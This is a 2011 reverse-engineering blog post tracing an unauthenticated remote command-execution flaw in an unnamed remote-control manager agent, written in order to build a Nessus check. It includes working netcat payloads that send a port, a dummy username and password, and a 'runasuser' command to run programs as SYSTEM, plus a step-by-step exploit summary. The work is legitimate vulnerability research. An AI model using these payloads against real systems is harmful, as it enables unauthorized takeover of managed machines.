---
id: 1197
title: Remote control manager FAIL
date: '2011-12-19T10:40:59-05:00'
author: ron
layout: post
guid: http://www.skullsecurity.org/blog/?p=1197
permalink: "/2011/remote-control-manager-fail"
categories:
- hacking
- re
comments_id: '109638359048485691'

---

Hey guys,

Today, I thought it'd be fun to take a good look at a serious flaw in some computer-management software. Basically, the software is designed for remotely controlling systems on networks (for installing updates or whatever). As far as I know, this vulnerability is currently unpatched; there are allegedly mitigations, but you have to pay to see them! (A note to vendors - making us pay for your patches or mitigation notes only makes your customers less secure. Please stop doing that!)

This research was done in the course of my work at Tenable Network Security on the Reverse Engineering team. It's an awesome team to work on, and we're always hiring (for this team and others)! If you're interested and you have mad reverse engineering skillz, or any kind of infosec skillz, get in touch with me privately! (rbowes-at-tenable-dot-com if you're interested in applying)
<!--more-->
<h2>The advisory</h2>
I'm not going to talk too much about the advisory, but I'll just say this: it was on ZDI, and basically said that the vulnerability was related to improper validation of credentials allowing the execution of arbitrary shell commands. Pretty vague, but certainly an interesting challenge!

<h2>Getting started</h2>
One of the obvious places to start is to load up the .exe file into IDA (disassembler) and look at the networking functions. Another - easier - option is load up a debugger (WinDbg) and throw a breakpoint on winsock32!recv or ws2_32!recv, then send data to the program to see where it breaks. That's normally the first thing I try if the protocol is unknown (and sometimes even if it's a known protocol). 

By putting a breakpoint on recv, sending it data with netcat, and using the 'gu' command to step out of the receive function, I wound up looking at this code in IDA:

<img src='/blogdata/01-remoteexec-recvloop.png'>

Basically, it calls recv with a length of '1' and stores the results in a local buffer. Then it jumps to this bit of code:

<img src='/blogdata/02-remoteexec-recvend.png'>

Essentially, it's checking if the value byte it just received is '0' (the null byte, "\0"). If it is, it falls through, does some logging, then returns (not shown). 

I decided to call this function "read_from_socket". 

Based on this little bit of code, I determined some information about the protocol - it receives a series of bytes, up to some maximum length, that are terminated by a null byte ("\0"). 

<h2>Diving into the protocol</h2>
The next thing we want to know is how or where the received data is used. We can trace through the assembly, or we can do it the easy way and use a debugger. So, naturally, I decided to take the easy way out and continued using the debugger. I opted to put a breakpoint at 40507c using Windbg, which is just below the recv code shown above:

<pre>0:002&gt; bp 40507c</pre>

Then I resume the process in Windbg with the 'g' command (or I can press F5):
<pre>0:002&gt; g</pre>

Then I use netcat to send 'test\0' (that is, test with a null byte at the end) to the process (note that this isn't the real port):
<pre><font color='#00FF00'>ron@armitage</font> <font color='#8080FF'>~ $</font> echo -ne "test\0" | nc -vv 192.168.1.112 1234
192.168.1.112: inverse host lookup failed: 
(UNKNOWN) [192.168.1.112] 1234 (?) open
 sent 5, rcvd 0
<font color='#00FF00'>ron@armitage</font> <font color='#8080FF'>~ $</font> 
</pre>

And, of course, back in the debugger, it hits our breakpoint. After that, we inspect ecx (which should be the buffer):
<pre>0:002> bp 40507c
0:002> g
Breakpoint 0 hit
eax=00000005 ebx=001576a8 ecx=00a2ec64 edx=00a2edbc esi=001576a8 edi=00000000
eip=0040507c esp=00a2eb08 ebp=00a2eb24 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
XXXXXXXX+0x507c:
0040507c 51              push    ecx
0:001> db ecx
00a2ec64  74 65 73 74 00 00 00 00-00 ff a2 00 10 00 00 00  test............
[...]
</pre>

ecx, as we would expect, points to the buffer we just received ("test\0", followed by whatever). Now, we want to know where that data is used. To do that, we use a break-on-access breakpoint - ba - which will break the program's execution when the data is read, then 'g', for 'go', to continue execution:
<pre>0:001> ba r4 00a2ec64
0:001> g
</pre>

Immediately afterwards, as expected, the breakpoint is hit when the process tries to read the "test\0" string:
<pre>Breakpoint 1 hit
eax=00000005 ebx=001576a8 ecx=00000000 edx=00000074 esi=001576a8 edi=00000000
eip=00404074 esp=00a2eb38 ebp=00a2ec8c iopl=0         nv up ei ng nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293
XXXXXXXX+0x4074:
00404074 85d2            test    edx,edx</pre>

It breaks at 404074! That means that line is where the buffer is read from memory (actually, it's read the line before - the break happens after the read, not before it)

Going back to IDA, here's what the code looks like:

<img src='/blogdata/08-remoteexec-digits.png'>

I circled the points where the buffer is read in red. First, it reads each character from a local variable that I named 'buffer' - [ebp+ecx+buffer] - into edx as a signed value (when you see a buffer being read with 'movsx' - move sign extend - that often leads to sign-extension vulnerabilities, though not in this case). It checks if it's null - which would mean it's at the end of the string - and exits the loop if it is.

A few lines later, the second time the buffer is read, it's read into ecx. Each character is passed into _isdigit() and, if it's not a digit, it exits the loop with an error message, "Illegal Port number". Hmm! So, now we know that the first part of the protocol is apparently a port number terminated by a null byte. Awesome! But weird? Why are we telling it a port number?

<h2>Connect back</h2>
If we scroll down in IDA a little bit, and find where the function ends after successfully reading a port number, here's the code we find:

<img src='/blogdata/09-remoteexec-connectback.png'>

There's some logging here - I love logging! - that says the value we just received is called the 'return socket'. Then a function is called that basically connects back to the client on the port number just received. I'm not going to go any deeper because the code isn't interesting or useful to us. I never did figure out what this second connection is used for, but the program doesn't seem to care if it fails.

So that's the first client-to-server message figured out! To summarize a bit:
<ul>
  <li>Client connects to server</li>
  <li>Client sends server a null-terminated port number</li>
  <li>Server connects back to client on that port</li>
  <li>The new connection isn't used for anything, as far as I can tell</li>
</ul>

<h2>Moving right along...</h2>
Now that we've got the first message all sorted out, we're interested in what the second message is. Rather than trying to navigate the tangled code (which leads through a select() and a few other functions), we're going to generate another packet with netcat and see where it's read, just like last time. 

First, we clear our breakpoints and put a new one on 40507c again (the same place as our last breakpoint - right after a packet is read):
<pre>0:001> bc *
0:001> bp 0040507c
0:001> g</pre>

Then we connect with netcat, this time with a proper connect-back port ("12345\0") and a second string ("test\0"):
<pre><font color='#00FF00'>ron@armitage</font> <font color='#8080FF'>~ $</font> echo -ne "12345\0test\0" | nc -vv 192.168.1.112 1234
192.168.1.112: inverse host lookup failed: 
(UNKNOWN) [192.168.1.112] 1234 (?) open
</pre>

The breakpoint we set earlier will fire on the first line again:
<pre>Breakpoint 0 hit
eax=00000006 ebx=001576a8 ecx=00a2ec64 edx=00a2edbc esi=001576a8 edi=00000000
eip=0040507c esp=00a2eb08 ebp=00a2eb24 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
xxxxxxxx+0x507c:
0040507c 51              push    ecx
0:001> db ecx
00a2ec64  31 32 33 34 35 00 00 00-00 ff a2 00 10 00 00 00  12345...........</pre>

But we aren't interested in that, and run 'g' to continue:
<pre>0:001> g
Breakpoint 0 hit
eax=00000005 ebx=001576a8 ecx=00a2ec64 edx=00a2edbc esi=001576a8 edi=00000000
eip=0040507c esp=00a2e7e0 ebp=00a2e7fc iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
xxxxxxxx+0x507c:
0040507c 51              push    ecx
0:001> db ecx
00a2ec64  74 65 73 74 00 00 00 00-00 00 00 00 00 00 00 00  test............</pre>

Now we've found the string we're interested in!

Once again, we put a breakpoint-on-read on ecx and resume execution. The process will break again when the "test\0" string is read:
<pre>0:001> g
Breakpoint 1 hit
eax=74736574 ebx=001576a8 ecx=00a2ec64 edx=00000000 esi=001576a8 edi=00000000
eip=00422162 esp=00a2e808 ebp=00a2ec8c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
xxxxxxxx+0x22162:
00422162 bafffefe7e      mov     edx,7EFEFEFFh</pre>

That is, at 422162. A pro-tip - if you notice the constant 0x7EFEFEFF, or something similar, you're probably in a string manipulation function. And this is no exception - according to IDA, this is strlen(). To get out, we use 'gu':
<pre>0:001> gu
Breakpoint 1 hit
eax=74736574 ebx=001576a8 ecx=00000001 edx=00000000 esi=00a2ec64 edi=00a3b0b8
eip=00422424 esp=00a2e708 ebp=00a2e710 iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
xxxxxxxx+0x22424:
00422424 89448ffc        mov     dword ptr [edi+ecx*4-4],eax ds:0023:00a3b0b8=00000000
</pre>

Now we're in memcpy! At this point, I started using 'gu' over and over till I finally found something interesting:
<pre>0:001> gu
eax=00a3b0b8 ebx=001576a8 ecx=00000001 edx=00000000 esi=00a35078 edi=00000000
eip=0041beb6 esp=00a2e718 ebp=00a2e734 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
xxxxxxxx+0x1beb6:
0041beb6 83c40c          add     esp,0Ch
0:001> gu
eax=00440000 ebx=001576a8 ecx=004448e4 edx=00000032 esi=00a35078 edi=00000000
eip=0041c056 esp=00a2e73c ebp=00a2e74c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
xxxxxxxx+0x1c056:
0041c056 83c40c          add     esp,0Ch
0:001> gu
eax=00440000 ebx=001576a8 ecx=004448e4 edx=00000032 esi=00a35078 edi=00000000
eip=00419d00 esp=00a2e754 ebp=00a2e798 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
xxxxxxxx+0x19d00:
00419d00 83c40c          add     esp,0Ch
0:001> gu
eax=00a30000 ebx=001576a8 ecx=00000000 edx=00a2e734 esi=00a35078 edi=00000000
eip=00416fe5 esp=00a2e7a0 ebp=00a2e7d4 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
xxxxxxxx+0x16fe5:
00416fe5 83c40c          add     esp,0Ch
0:001> gu
eax=00000000 ebx=001576a8 ecx=00436f88 edx=00040000 esi=001576a8 edi=00000000
eip=004187f5 esp=00a2e7dc ebp=00a2e7ec iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
xxxxxxxx+0x187f5:
004187f5 83c40c          add     esp,0Ch
0:001> gu
eax=00000000 ebx=001576a8 ecx=00436f88 edx=00040000 esi=001576a8 edi=00000000
eip=0041f5ca esp=00a2e7f4 ebp=00a2e800 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
xxxxxxxx+0x1f5ca:
0041f5ca 83c40c          add     esp,0Ch
0:001> gu
eax=00000000 ebx=001576a8 ecx=00436f88 edx=00040000 esi=001576a8 edi=00000000
eip=00404465 esp=00a2e808 ebp=00a2ec8c iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
xxxxxxxx+0x4465:
00404465 83c408          add     esp,8</pre>

Finally, at 404465, I see this code:

<img src='/blogdata/14-remoteexec-steppedout.png'>

"Getting password"! It looks like I ran into some authentication code! If I scroll down further, I find this code:

<img src='/blogdata/17-remoteexec-receive-cmd.png'>

"Getting command", followed by a call to read_from_socket(), which is the function that basically does recv(). Sweet! 

It would take too many screenshots to show it all here, but to summarize the function I'm looking at, it basically takes the following actions:

<ul>
  <li>Logs "Getting username"</li>
  <li>Reads a string up to a null byte (\0)</li>
  <li>(we broke into the function right here while it was processing that string)</li>
  <li>Logs "Getting password"</li>
  <li>Reads a string up to a null byte (\0)</li>
  <li>Logs "Getting command"</li>
  <li>Reads a string up to a null byte (\0)</li>
</ul>

There are many ways to proceed from here, but I figured I'd put a breakpoint on the read following the "Getting command" line, and then to send a string with all the requisite fields (a connect-back port, a username, a password, and a command). Knowing from the advisory that the vulnerability was in the authentication, I decided to try sending in garbage values. I didn't try looking at the code where the username/password are verified - I figured I'd just skip that code (it's pretty long). 
<pre>0:001> bc *
0:001> bp 40465d
0:001> g</pre>

Then run the app and use netcat to send a test command:
<pre><font color='#00FF00'>ron@armitage</font> <font color='#8080FF'>~ $</font> echo -ne "12345\0myuser\0mypass\0mycommand\0" | nc -vv 192.168.1.112 1234
192.168.1.112: inverse host lookup failed: 
(UNKNOWN) [192.168.1.112] 1234 (?) open
</pre>

And, it breaks! 
<pre>0:001> bc *
0:001> bp 40465d
0:001> g
Breakpoint 0 hit
eax=00a2edbc ebx=001576a8 ecx=00a2e83c edx=00000032 esi=001576a8 edi=00000000
eip=0040465d esp=00a2e804 ebp=00a2ec8c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
xxxxxxxx+0x465d:
0040465d e84e090000      call    xxxxxxxx+0x4fb0 (00404fb0)</pre>

Sweet! 

I took a few dead-end paths here, but eventually I decided that, knowing that 'mycommand' is the command it's planning to run, I'd put a breakpoint on CreateProcessA, send the 'mycommand' string again, and see what happens:
<pre>0:001> bc *
0:001> bp kernel32!CreateProcessA
0:001> bp kernel32!CreateProcessW
0:001> g
</pre>

Then the netcat command again:
<pre><font color='#00FF00'>ron@armitage</font> <font color='#8080FF'>~ $</font> echo -ne "12345\0myuser\0mypass\0mycommand\0" | nc -vv 192.168.1.112 1234
192.168.1.112: inverse host lookup failed: 
(UNKNOWN) [192.168.1.112] 1234 (?) open
</pre>

Then, the breakpoint fires:
<pre>Breakpoint 0 hit
eax=00000000 ebx=001576a8 ecx=00a2db48 edx=00a29cc0 esi=00000029 edi=00000000
eip=77e424b9 esp=00a29788 ebp=00a2df60 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
kernel32!CreateProcessA:
77e424b9 8bff            mov     edi,edi</pre>

Sure enough, it breaks! I immediately run 'gu' ('go up') to exit the CreateProcessA function:
<pre>0:001> gu
eax=00000000 ebx=001576a8 ecx=77e722e9 edx=00000000 esi=00000029 edi=00000000
eip=0040b964 esp=00a297b4 ebp=00a2df60 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
xxxxxxxx+0xb964:
0040b964 898558bdffff    mov     dword ptr [ebp-42A8h],eax ss:0023:00a29cb8=7ffdd000</pre>

And find myself at 40b964. Loading up that address in IDA, here's what it looks like (the call is circled in red):

<img src='/blogdata/27-remoteexec-createprocess-ida.png'>

I'd like to verify the command that's being sent to CreateProcessA, to see if it's something I can manipulate easily. So I put a breakpoint at 40b95e:
<pre>0:001> bc *
0:001> bp 40b95e
0:001> g</pre>

And send the usual command:
<pre><font color='#00FF00'>ron@armitage</font> <font color='#8080FF'>~ $</font> echo -ne "12345\0myuser\0mypass\0mycommand\0" | nc -vv 192.168.1.112 1234
192.168.1.112: inverse host lookup failed: 
(UNKNOWN) [192.168.1.112] 1234 (?) open</pre>

When it breaks, I dump the memory at ecx - the register that stores the command:
<pre>Breakpoint 0 hit
eax=00000000 ebx=001576a8 ecx=00a2db48 edx=00a29cc0 esi=00000029 edi=00000000
eip=0040b95e esp=00a2978c ebp=00a2df60 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
xxxxxxxx+0xb95e:
0040b95e ff15cc004300    call    dword ptr [xxxxxxxx+0x300cc (004300cc)] ds:0023:004300cc={kernel32!CreateProcessA (77e424b9)}
0:001> db ecx
00a2db48  43 3a 5c 50 52 4f 47 52-41 7e 31 5c xx xx xx xx  C:\PROGRA~1\XXXX
00a2db58  xx xx 7e 31 5c xx xx xx-xx 5c 41 67 65 6e 74 5c  XX~1\XXXX\Agent\
00a2db68  6d 79 63 6f 6d 6d 61 6e-64 20 00 00 00 00 00 00  mycommand ......</pre>

Aha! It's prepending the path to the program's folder to our command and passing it to CreateProcessA! The natural thing to do is to use '../' to escape this folder and run something else, but that doesn't work. I never actually figured out why - and it seemed to kinda work - but it was doing some sort of filtering that would give me bad results. Eventually, I had an idea - which programs are stored in that folder anyways?

<img src='/blogdata/31-remoteexec-programs.png'>

execute.exe? hide.exe? runasuser.exe? Could it BE that simple?

I fire up netcat again:
<pre><font color='#00FF00'>ron@armitage</font> <font color='#8080FF'>~ $</font> echo -ne "12345\0myuser\0mypass\0runasuser calc\0" | nc -vv 192.168.1.112 1234
192.168.1.112: inverse host lookup failed: 
(UNKNOWN) [192.168.1.112] 1234 (?) open
 sent 35, rcvd 1
</pre>

And check the process list:

<img src='/blogdata/33-remoteexec-calc-running.png'>

And ho-ly crap! We have command execution! Unauthenticated! As SYSTEM!! Game over, I win! 

<h2>Writing the check</h2>
But wait, there's no output on netcat. No indication at all that this worked, in fact. Crap! Wut do?

It occurred to me that this particular application also has a Web server built in. Can I write to files using this command execution? I try:
<pre><font color='#00FF00'>ron@armitage</font> <font color='#8080FF'>~ $</font> echo -ne "12345\0myuser\0mypass\0runasuser cmd /c \"ipconfig > c:\\myfile\"\0" | nc -vv 192.168.1.112 1234
192.168.1.112: inverse host lookup failed: 
(UNKNOWN) [192.168.1.112] 1234 (?) open
 sent 60, rcvd 1
</pre>

And check the file:

<img src='/blogdata/36-remoteexec-success.png'>

Yup, works like a charm! (Don't mind the bad ip address - I took some of these screenshots at different times than others)

I change the code a little bit to point to the Web root and give it a go, and sure enough it works. With that, I can now write a proper check for Nessus. And with that, I'm done. 

<h2>Summary</h2>
So, the TL;DR version of this is:
<ul>
 <li>Connect to the host</li>
 <li>Send it a port number, following by a null byte ("\0") - the host will try to connect back on that port</li>
 <li>Send a username and a password, each terminated by a null byte - these will be ignored</li>
 <li>Send a command using the "runasuser.exe" program - included</li>
 <li>Profit!</li>
</ul>
